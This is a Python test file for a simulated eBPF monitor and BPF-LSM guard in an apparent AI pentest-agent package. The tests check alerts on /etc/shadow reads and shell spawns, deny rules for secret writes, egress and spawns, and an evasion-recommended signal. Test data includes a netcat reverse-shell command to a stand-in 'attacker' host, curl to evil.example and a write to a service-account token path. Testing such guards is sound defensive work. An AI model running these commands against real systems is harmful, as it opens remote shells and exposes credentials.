"""ebpf_monitor.py: simulated kernel observability + BPF-LSM blast-radius (Pillar 3)."""
from __future__ import annotations

from agentpentest.ebpf_monitor import (EbpfMonitor, LsmDenied, LsmPolicy, SyscallEvent,
                                       lsm_guard)


def test_sensitive_read_raises_critical_alert():
    mon = EbpfMonitor()
    fired = mon.observe(SyscallEvent("cat", "openat", "/etc/shadow"))
    assert any(a.priority == "Critical" for a in fired), fired


def test_shell_spawn_alert():
    mon = EbpfMonitor()
    fired = mon.observe(SyscallEvent("python", "execve", "/bin/bash"))
    assert any(a.rule == "spawned_shell" for a in fired), fired


def test_edr_blocks_drive_evasion_signal():
    mon = EbpfMonitor()
    for _ in range(10):
        mon.observe(SyscallEvent("nmap", "connect", "10.0.0.5", blocked=True))
    assert mon.noise_level() == 1.0
    assert mon.evasion_recommended()


def test_clean_traffic_no_evasion():
    mon = EbpfMonitor()
    for _ in range(10):
        mon.observe(SyscallEvent("nmap", "connect", "10.0.0.5"))
    assert not mon.evasion_recommended()


def test_lsm_denies_forbidden_write():
    mon = EbpfMonitor()
    assert mon.enforce_path_write("/var/run/secrets/token").allowed is False
    assert mon.enforce_path_write("/tmp/loot").allowed is True


def test_lsm_egress_allowlist():
    mon = EbpfMonitor(policy=LsmPolicy(egress_allowlist=("gateway.local",)))
    assert mon.enforce_egress("evil.example").allowed is False
    assert mon.enforce_egress("gateway.local").allowed is True


def test_lsm_spawn_denylist():
    mon = EbpfMonitor(policy=LsmPolicy(forbidden_spawns=("bash",)))
    assert mon.enforce_spawn("/bin/bash").allowed is False
    assert mon.enforce_spawn("/usr/bin/nmap").allowed is True


def test_lsm_guard_lets_clean_command_run():
    ran = []
    g = lsm_guard(lambda argv, t: ran.append(argv) or "out", EbpfMonitor())
    assert g(["nmap", "-sV", "10.0.0.5"], "10.0.0.5") == "out"
    assert ran == [["nmap", "-sV", "10.0.0.5"]]


def test_lsm_guard_blocks_forbidden_write_before_exec():
    ran = []
    g = lsm_guard(lambda argv, t: ran.append(argv) or "out", EbpfMonitor())
    try:
        g(["tee", "/var/run/secrets/token"], "10.0.0.5")
        raise AssertionError("expected LsmDenied")
    except LsmDenied:
        pass
    assert ran == []                                   # denied command never ran


def test_lsm_guard_blocks_forbidden_spawn():
    mon = EbpfMonitor(policy=LsmPolicy(forbidden_spawns=("nc",)))
    g = lsm_guard(lambda argv, t: "out", mon)
    try:
        g(["nc", "-e", "/bin/sh", "attacker"], "10.0.0.5")
        raise AssertionError("expected LsmDenied")
    except LsmDenied:
        pass


def test_lsm_guard_egress_scope():
    g = lsm_guard(lambda argv, t: "out", EbpfMonitor(), egress_scope=("10.0.0.5",))
    assert g(["curl", "10.0.0.5"], "10.0.0.5") == "out"
    try:
        g(["curl", "evil.example"], "evil.example")
        raise AssertionError("expected LsmDenied on off-scope egress")
    except LsmDenied:
        pass


if __name__ == "__main__":
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            fn()
    print("ok")
